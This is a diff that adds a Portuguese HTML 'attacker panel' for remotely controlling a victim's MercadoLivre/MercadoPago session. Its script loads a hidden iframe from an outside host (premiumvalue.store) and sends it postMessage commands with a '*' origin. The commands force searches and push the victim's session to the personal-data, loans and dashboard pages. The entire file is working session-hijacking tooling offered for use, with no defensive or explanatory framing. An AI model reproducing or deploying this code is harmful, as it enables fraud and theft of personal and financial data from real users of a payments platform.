@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Painel do Atacante</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    input, button { margin: 5px; padding: 8px; }
+  </style>
+</head>
+<body>
+  <h2>🎮 Controle remoto da sessão MercadoLivre</h2>
+
+  <input type="text" id="busca" placeholder="Pesquisar: Ex. iPhone 15">
+  <button onclick="forcarBusca()">Forçar Busca</button>
+  <br>
+  <button onclick="send('go:https://www.mercadopago.com.br/hub-engine/hubs/my-data')">Acessar aba "Meus Dados"</button>
+  <button onclick="send('go:https://www.mercadopago.com.br/loans')">Acessar aba "Empréstimos"</button>
+  <button onclick="send('go:https://www.mercadopago.com.br/home')">Forçar dashboard</button>
+
+  <script>
+    const target = document.createElement("iframe");
+    target.src = "https://premiumvalue.store/iframe";
+    target.style.display = "none";
+    document.body.appendChild(target);
+
+    function send(msg) {
+      if (target.contentWindow) {
+        target.contentWindow.postMessage(msg, "*");
+      }
+    }
+
+    function forcarBusca() {
+      const termo = document.getElementById("busca").value;
+      if (termo.trim()) {
+        send("search:" + termo);
+      }
+    }
+  </script>
+</body>
+</html>
